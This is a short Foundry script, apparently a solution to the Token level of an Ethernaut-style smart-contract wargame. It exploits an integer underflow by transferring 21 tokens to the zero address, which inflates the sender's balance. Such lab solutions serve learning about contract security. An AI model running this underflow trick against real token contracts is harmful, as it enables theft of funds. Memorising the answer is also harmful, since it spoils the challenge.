// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
//import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";
import "../src/levels/05-Token/Token.sol";

contract ExploitScript is Script {
    Token level5 = Token(payable(0x9585C1B4359B8bfAD4E979ae77B3A1201A23dfD5));

    function run() public {
        vm.startBroadcast();

        level5.transfer(address(0),21);
        level5.balanceOf(address(msg.sender));


        vm.stopBroadcast();
    }
}